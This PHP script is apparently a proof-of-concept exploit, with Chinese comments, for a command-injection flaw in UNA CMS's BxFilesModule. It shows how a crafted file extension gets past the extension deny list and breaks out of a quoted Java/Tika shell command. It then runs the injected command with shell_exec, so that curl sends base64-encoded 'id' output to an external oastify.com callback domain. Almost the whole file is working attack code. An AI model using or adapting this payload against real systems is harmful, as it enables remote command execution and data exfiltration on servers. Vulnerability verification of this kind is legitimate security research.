<?php
/**
 * UNA CMS BxFilesModule RCE - 端到端验证 (本地 Docker)
 * 直接在容器内模拟完整攻击链: 上传恶意文件 → 触发cron → shell_exec → OOB回调
 */
error_reporting(E_ALL);

$DOMAIN = "1km7arl9xh2hw177qgm1drw6qxwokg85.oastify.com";
$FLAG = "LOCAL_RCE_" . time();
$MALICIOUS_EXT = 'pdf";curl -ksS "https://' . $DOMAIN . '/' . $FLAG . '_$(id|base64|tr -d \"\n\")";#';

echo "═══════════════════════════════════════════════\n";
echo " UNA BxFilesModule RCE - Docker 端到端验证\n";
echo "═══════════════════════════════════════════════\n\n";

// Step 1: Simulate pathinfo extraction (exactly as in production)
$ext = strtolower(pathinfo("test." . $MALICIOUS_EXT, PATHINFO_EXTENSION));
echo "[Step 1] pathinfo 提取扩展名\n";
echo "  输入: test.$MALICIOUS_EXT\n";
echo "  输出: $ext\n";
echo "  shell 元字符保留: " . (strpos($ext, '"') !== false ? "✓ (注入可能)" : "✗") . "\n\n";

// Step 2: Simulate isValidExt (exactly as in production)
$ext_deny = explode(',', 'action,apk,app,bat,bin,cmd,com,command,cpl,csh,exe,gadget,inf,ins,inx,ipa,isu,job,jse,ksh,lnk,msc,msi,msp,mst,osx,out,paf,pif,prg,ps1,reg,rgs,run,sct,shb,shs,u3p,vb,vbe,vbs,vbscript,workflow,ws,wsf');
$isDenied = in_array($ext, $ext_deny);
echo "[Step 2] isValidExt 绕过\n";
echo "  in_array('$ext', ext_deny) → " . ($isDenied ? "拒绝 ✗" : "绕过 ✓") . "\n\n";

// Step 3: Simulate file path construction (BxFilesModule:242)
$remoteId = "abc123";
$sFilePath = "/tmp/" . $remoteId . "." . $ext;
echo "[Step 3] 文件路径拼接\n";
echo "  \$sFilePath = '$sFilePath'\n";
echo "  注意: 双引号会闭合外层 shell 引号\n\n";

// Step 4: Simulate command construction (BxFilesModule:249)
if (!file_exists('/tmp/abc123.pdf')) file_put_contents('/tmp/abc123.pdf', 'dummy');
$sCommand = '"java" -Djava.awt.headless=true -jar "tika-app.jar" --encoding=UTF-8 --text "' . $sFilePath . '"';
echo "[Step 4] 完整命令\n";
echo "  $sCommand\n\n";

// Step 5: Show shell interpretation
echo "[Step 5] Shell 解析\n";
echo "  java ... --text \"/tmp/abc123.pdf\"\n";
echo "  ; curl -ksS \"https://$DOMAIN/${FLAG}...\"  ← 注入的命令!\n";
echo "  ; #\"\n\n";

// Step 6: ACTUAL EXECUTION
echo "[Step 6] 实际执行 shell_exec\n";
$output = shell_exec($sCommand . ' 2>&1');
echo "  输出:\n";
echo "  " . str_replace("\n", "\n  ", trim($output)) . "\n\n";

// Step 7: Check for OOB
echo "[Step 7] 本地验证\n";
$id_output = shell_exec('id 2>&1');
echo "  id 命令输出: " . trim($id_output) . "\n";
echo "  如果上面 shell_exec 输出包含 uid=... 说明命令注入成功\n\n";

echo "═══════════════════════════════════════════════\n";
echo " Flag: $FLAG\n";
echo " OASTify: https://$DOMAIN\n";
echo " 如果 curl 命令执行，会在 OASTify 看到回调\n";
echo "═══════════════════════════════════════════════\n";
